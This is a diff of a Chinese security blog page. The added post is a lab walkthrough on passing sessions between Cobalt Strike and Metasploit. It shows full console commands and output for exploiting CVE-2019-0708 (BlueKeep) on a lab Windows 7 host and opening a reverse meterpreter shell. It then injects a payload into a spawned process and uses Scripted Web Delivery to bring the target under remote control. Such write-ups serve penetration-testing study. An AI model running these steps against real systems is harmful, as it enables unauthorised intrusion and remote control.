@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【工具分享】一个爬取各大SRC厂家公告的小工具, Teams Six">
+    <meta name="keywords" content="【经验总结】CS与MSF之间的会话传递, Teams Six">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>【工具分享】一个爬取各大SRC厂家公告的小工具 | Teams Six</title>
+    <title>【经验总结】CS与MSF之间的会话传递 | Teams Six</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -257,12 +257,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-11-15_18-35-17.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【工具分享】一个爬取各大SRC厂家公告的小工具</h1>
+                    <h1 class="description center-align post-title">【经验总结】CS与MSF之间的会话传递</h1>
                 </div>
             </div>
         </div>
@@ -379,16 +379,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Python/">
-                                <span class="chip bg-color">Python</span>
+                            <a href="/tags/Cobalt-Strike/">
+                                <span class="chip bg-color">Cobalt Strike</span>
                             </a>
                         
-                            <a href="/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/">
-                                <span class="chip bg-color">批量工具</span>
+                            <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                                <span class="chip bg-color">经验总结</span>
                             </a>
                         
-                            <a href="/tags/SRC/">
-                                <span class="chip bg-color">SRC</span>
+                            <a href="/tags/MSF/">
+                                <span class="chip bg-color">MSF</span>
                             </a>
                         
                     </div>
@@ -399,8 +399,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/" class="post-category">
-                                工具分享
+                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
+                                经验总结
                             </a>
                         
                     </div>
@@ -412,28 +412,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-15
+                    2021-01-29
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-15
+                    2021-01-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    573
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    7 分
                 </div>
                 
 
@@ -448,30 +448,154 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平时在挖洞的时候，往往会关注其有没有活动之类的公告，但是国内那么多家厂商，一个个的去关注难免效率比较低，因此这里写了一个爬取各大SRC厂家公告的小工具，没啥技术含量，都是体力活。</p>
-<p>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/teamssix/src_notice">https://github.com/teamssix/src_notice</a></p>
-<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>✔ 爬取各个SRC平台的公告通知</p>
-<p>✔ 对2020年发布的活动通知进行红色高亮显示</p>
-<p>✔ 【进阶版】将当天发布的公告推送到微信上，结合系统定时任务可实现SRC平台公告监测</p>
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework</p>
+<p>Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：</p>
+<p>1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708</p>
+<p>2、Metasploit Framework 发起攻击，获取会话</p>
+<p>3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon</p>
+<p>4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块</p>
+<p>5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可</p>
+<p>Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：</p>
+<p>1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线</p>
+<p>2、接着，Metasploit Framework 调用 exploit/multi/handler 模块</p>
+<p>3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可</p>
+<p>4、 之后运行该模块</p>
+<p>5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口</p>
+<p>7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可</p>
 <blockquote>
-<p><strong>在我的微信公众号“TeamsSix”后台回复“SRC”即可获得进阶版下载地址</strong></p>
+<p>环境信息：</p>
+<p>攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）</p>
+<p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p>
 </blockquote>
-<p>✔ 支持的SRC平台【当前共计27家】：</p>
-<p>360、58、阿里、阿里本地生活、爱奇艺、百度、贝壳、哔哩哔哩、菜鸟、滴滴出行、度小满、瓜子、京东、蚂蚁金服、美团、陌陌、OPPO、平安、水滴互助、顺丰、腾讯、vivo、网易、唯品会、WIFI万能钥匙、中通、字节跳动</p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><pre><code>git clone https://github.com/teamssix/src_notice.git
-cd src_notice
-pip3 install -r requirements.txt
-python3 src_notice.py</code></pre>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-11-15_18-35-17.png"></p>
-<h1 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h1><p>进阶版比普通版多了一个微信通知的功能，结合系统定时任务可实现SRC平台公告监测。<strong>在我的微信公众号“TeamsSix”后台回复“SRC”即可获得进阶版下载地址</strong></p>
-<h3 id="如何实现微信通知？"><a href="#如何实现微信通知？" class="headerlink" title="如何实现微信通知？"></a>如何实现微信通知？</h3><p>进阶版下载好后，在 503 行代码中添加上你自己的 Server酱 key 就行了， Server酱 key 的申请地址为：<a target="_blank" rel="noopener" href="http://sc.ftqq.com/">http://sc.ftqq.com/</a></p>
-<h3 id="如何实现公告监测？"><a href="#如何实现公告监测？" class="headerlink" title="如何实现公告监测？"></a>如何实现公告监测？</h3><p>首先在 vps 上下载安装该工具，之后设置定时任务即可。比如我想在每天的上午 9 点获取一下各大 SRC 有没有新的公告：</p>
-<p>1、输入<code>crontab -e</code></p>
-<p>2、在打开的界面中输入<code>00 9 * * * python3 /root/src_notice/src_notice.py</code>即可。</p>
-<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>1、如果之前没有编辑过定时任务，第一次打开会提示选择编辑器，根据自己喜好选择即可</p>
-<p>2、上面命令中的 <code>python3 /root/src_notice/src_notice.py</code>要修改成你自己的绝对路径，我这里是在 root 目录下的</p>
-<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><blockquote>
-<p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p>
+<h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p>
+<pre><code>./teamserver yourip yourpassword</code></pre>
+<p>之后打开 Cobalt Strike 客户端进行连接</p>
+<pre><code>./start.sh</code></pre>
+<p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png"></p>
+<h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p>
+<pre><code>msfconsole </code></pre>
+<p>调用 CVE-2019-0708 模块</p>
+<pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre>
+<p>设置靶机 IP</p>
+<pre><code>set rhost 192.168.175.177</code></pre>
+<p>设置 Payload</p>
+<pre><code>set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.175.200</code></pre>
+<p>发起攻击</p>
+<pre><code>exploit</code></pre>
+<p>整体过程如下：</p>
+<pre><code>root@kali:~# msfconsole
+
+msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177
+rhost =&gt; 192.168.175.177
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200
+lhost =&gt; 192.168.175.200
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit
+[*] Started reverse TCP handler on 192.168.175.200:4444 
+[*] 192.168.175.177:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
+[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
+[!] 192.168.175.177:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
+[*] 192.168.175.177:3389 - Surfing channels ...
+[*] 192.168.175.177:3389 - Lobbing eggs ...
+[*] 192.168.175.177:3389 - Forcing the USE of FREE&#39;d object ...
+[!] 192.168.175.177:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
+[*] Sending stage (206403 bytes) to 192.168.175.177
+[*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400
+
+meterpreter &gt; </code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png"></p>
+<h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p>
+<pre><code>background</code></pre>
+<p>调用 payload_inject 模块</p>
+<pre><code>use exploit/windows/local/payload_inject</code></pre>
+<p>设置 HTTPS Payload</p>
+<pre><code>set payload windows/meterpreter/reverse_https</code></pre>
+<p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p>
+<pre><code>set lhost 192.168.175.200
+set lport 443</code></pre>
+<p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p>
+<pre><code>set DisablePayloadHandler True</code></pre>
+<p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p>
+<pre><code>set PrependMigrate True</code></pre>
+<p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p>
+<pre><code> set session 4</code></pre>
+<p>开始会话传递</p>
+<pre><code>run</code></pre>
+<p>整体过程如下：</p>
+<pre><code>msf5 &gt; background 
+[*] Backgrounding session 4...
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; use exploit/windows/local/payload_inject
+
+msf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_https
+payload =&gt; windows/meterpreter/reverse_https
+
+msf5 exploit(windows/local/payload_inject) &gt; set lhost 192.168.175.200
+lhost =&gt; 192.168.175.200
+
+msf5 exploit(windows/local/payload_inject) &gt; set lport 443
+lport =&gt; 443
+
+msf5 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler True
+DisablePayloadHandler =&gt; true
+
+msf5 exploit(windows/local/payload_inject) &gt; set PrependMigrate True
+PrependMigrate =&gt; True
+
+msf5 exploit(windows/local/payload_inject) &gt;  set session 4
+session =&gt; 4
+
+msf5 exploit(windows/local/payload_inject) &gt; run
+[*] Running module against WIN-T0UES7KBMJ5
+[*] Spawned Notepad process 544
+[*] Injecting payload into 544
+[*] Preparing &#39;windows/meterpreter/reverse_https&#39; for PID 544</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png"></p>
+<p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png"></p>
+<h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png"></p>
+<h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p>
+<pre><code>use exploit/multi/handler</code></pre>
+<p>设置 HTTP Payload</p>
+<pre><code>set payload windows/meterpreter/reverse_http
+set lhost 192.168.175.200
+set lport 4480</code></pre>
+<p>运行该模块</p>
+<pre><code>run</code></pre>
+<p>整体过程如下：</p>
+<pre><code>msf5 &gt; use exploit/multi/handler
+
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
+payload =&gt; windows/meterpreter/reverse_http
+
+msf5 exploit(multi/handler) &gt; set lhost 192.168.175.200
+lhost =&gt; 192.168.175.200
+
+msf5 exploit(multi/handler) &gt; set lport 4480
+lport =&gt; 4480
+
+msf5 exploit(multi/handler) &gt; run
+[*] Started HTTPS reverse handler on http://192.168.175.200:4480</code></pre>
+<h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png"></p>
+<p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png"></p>
+<p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png"></p>
+<blockquote>
+<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
 
@@ -499,7 +623,7 @@ python3 src_notice.py</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/year/201115-194850.html">https://www.teamssix.com/year/201115-194850.html</a>
+                    <a href="https://www.teamssix.com/year/210129-191714.html">https://www.teamssix.com/year/210129-191714.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -537,16 +661,16 @@ python3 src_notice.py</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Python/">
-                                    <span class="chip bg-color">Python</span>
+                                <a href="/tags/Cobalt-Strike/">
+                                    <span class="chip bg-color">Cobalt Strike</span>
                                 </a>
                             
-                                <a href="/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/">
-                                    <span class="chip bg-color">批量工具</span>
+                                <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                                    <span class="chip bg-color">经验总结</span>
                                 </a>
                             
-                                <a href="/tags/SRC/">
-                                    <span class="chip bg-color">SRC</span>
+                                <a href="/tags/MSF/">
+                                    <span class="chip bg-color">MSF</span>
                                 </a>
                             
                         </div>
@@ -591,7 +715,7 @@ python3 src_notice.py</code></pre>
         repo: 'Gitalk',
         owner: 'teamssix',
         admin: "teamssix",
-        id: '2020-11-15T19-48-50',
+        id: '2021-01-29T19-17-14',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -615,49 +739,55 @@ python3 src_notice.py</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/202025-235012.html">
+                <a href="/year/210129-191714.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/url_batch_discovery_1.png" class="responsive-img" alt="【工具分享】一款自己经常使用的URL批量识别小工具">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png" class="responsive-img" alt="【经验总结】CS与MSF之间的会话传递">
                         
-                        <span class="card-title">【工具分享】一款自己经常使用的URL批量识别小工具</span>
+                        <span class="card-title">【经验总结】CS与MSF之间的会话传递</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            圣诞节快乐
+                            0x00 前言众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Fr
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/" class="post-category">
-                                    工具分享
+                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
+                                    经验总结
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Python/">
-                        <span class="chip bg-color">Python</span>
+                    <a href="/tags/Cobalt-Strike/">
+                        <span class="chip bg-color">Cobalt Strike</span>
                     </a>
                     
-                    <a href="/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/">
-                        <span class="chip bg-color">批量工具</span>
+                    <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">经验总结</span>
+                    </a>
+                    
+                    <a href="/tags/MSF/">
+                        <span class="chip bg-color">MSF</span>
                     </a>
                     
                 </div>
@@ -671,30 +801,30 @@ python3 src_notice.py</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/201023-192553.html">
+                <a href="/year/210107-162325.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs7-9.png" class="responsive-img" alt="【建议收藏】CS学习笔记合集">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png" class="responsive-img" alt="【经验总结】记录一次有点儿不一样的XSS">
                         
-                        <span class="card-title">【建议收藏】CS学习笔记合集</span>
+                        <span class="card-title">【经验总结】记录一次有点儿不一样的XSS</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            本文仅在我的公众号和博客更新
+                            最近在挖SRC的时候，碰到一个有点儿不一样的XSS，在此简单记录一下。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-23
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-07
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    学习笔记
+                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
+                                    经验总结
                                 </a>
                             
                             
@@ -704,16 +834,16 @@ python3 src_notice.py</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
+                    <a href="/tags/SRC/">
+                        <span class="chip bg-color">SRC</span>
                     </a>
                     
-                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">学习笔记</span>
+                    <a href="/tags/XSS/">
+                        <span class="chip bg-color">XSS</span>
                     </a>
                     
-                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                        <span class="chip bg-color">红队</span>
+                    <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">经验总结</span>
                     </a>
                     
                 </div>
